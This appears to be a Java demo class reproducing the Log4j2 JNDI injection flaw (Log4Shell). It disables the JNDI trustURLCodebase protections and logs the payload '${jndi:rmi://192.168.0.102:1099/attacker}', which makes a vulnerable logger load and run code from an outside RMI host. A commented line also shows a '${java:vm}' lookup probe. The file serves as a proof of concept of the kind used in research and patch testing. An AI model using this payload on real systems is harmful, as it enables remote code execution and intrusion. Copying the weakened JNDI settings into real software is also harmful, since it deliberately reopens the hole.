package org.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * @ClassName : Log4j2Demo
 * @Description :
 * @Author : GC
 * @Date: 2021-12-11 15:16
 */
public class Log4j2Demo {

    private static final Logger logger = LogManager.getLogger();

    public static void main(String[] args) {
        //String username = "${java:vm}";
        //String username = "world";

        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");

        String username="${jndi:rmi://192.168.0.102:1099/attacker}";

        logger.error("Hello,{}!",username);
    }

}


